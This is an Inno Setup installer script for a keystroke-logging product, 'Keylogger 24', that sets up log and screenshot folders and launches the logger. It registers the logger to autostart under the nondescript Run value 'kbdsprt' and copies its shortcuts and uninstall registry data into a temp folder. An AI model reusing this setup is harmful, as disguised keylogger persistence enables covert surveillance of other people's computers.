[Setup]
AppName=Keylogger 24 1.3
AppId=Keylogger 24
AppVerName=Keylogger 24 1.3
AppCopyright=Copyright (c) 2009-2012 Spyrix Security Inc.
AppPublisher=Spyrix Security Inc.
AppVersion=1.3
AppPublisherURL=http://www.spyrix.com
AppSupportURL=http://www.spyrix.com
VersionInfoVersion=1.3
VersionInfoTextVersion=1.3
VersionInfoCompany=Spyrix Security Inc.
VersionInfoCopyright=Copyright(c) 2009-2012 Spyrix Security Inc.
DefaultDirName={pf}\Keylogger 24
DefaultGroupName=Keylogger 24
OutputBaseFilename=keylogger24-setup
Compression=lzma/max
SolidCompression=yes
AlwaysRestart=no
SetupIconFile=newdistrib.ico

[Dirs]
Name: "{commonappdata}\Keylogger 24";
Name: "{commonappdata}\Keylogger 24\scr";
Name: "{commonappdata}\Keylogger 24\logs";
Name: "{commonappdata}\Keylogger 24\temp";
Name: "{commonappdata}\Keylogger 24\temp\start";
Name: "{commonappdata}\Keylogger 24\temp\reg";
Name: "{commonappdata}\Keylogger 24\temp\desktop";

[Files]
Source: "..\SETUP_SOURCES\*.*"; DestDir: "{app}"; Flags: ignoreversion;
Source: "..\SETUP_SOURCES\skins\*.*"; DestDir: "{app}\skins\"; Flags: ignoreversion;
Source: "..\SETUP_SOURCES\lng\*.*"; DestDir: "{app}\lng\"; Flags: ignoreversion;
Source: "..\SETUP_SOURCES\temp\reg\*.*"; DestDir: "{commonappdata}\Keylogger 24\temp\reg\"; Flags: ignoreversion;

[Icons]
Name: "{group}\Keylogger 24"; Filename: "{app}\Keylogger24.exe";
Name: "{commonappdata}\Keylogger 24\temp\start\Keylogger 24"; Filename: "{app}\Keylogger24.exe";
Name: "{group}\{cm:UninstallProgram, Keylogger 24}"; Filename: "{uninstallexe}";
Name: "{commonappdata}\Keylogger 24\temp\start\{cm:UninstallProgram, Keylogger 24}"; Filename: "{uninstallexe}";
Name: "{userdesktop}\Keylogger 24"; Filename: "{app}\Keylogger24.exe"; WorkingDir: "{app}";
Name: "{commonappdata}\Keylogger 24\temp\desktop\Keylogger 24"; Filename: "{app}\Keylogger24.exe"; WorkingDir: "{app}";


[Registry]
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "kbdsprt"; ValueData: "{app}\Keylogger24.exe"; Flags: uninsdeletevalue
Root: HKLM; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\LocalSysData"; Flags: uninsdeletekey

[Run]
Filename: "regedit.exe"; Parameters: "/e ""{commonappdata}\Keylogger 24\temp\reg\info.uid"" ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Keylogger 24_is1"""
Filename: "{app}\Keylogger24.exe"; Description: "Launch Keylogger 24"; Flags:postinstall nowait hidewizard;

[UninstallDelete]
Type: files; Name: "{commonappdata}\Keylogger 24\temp\logger.ini"










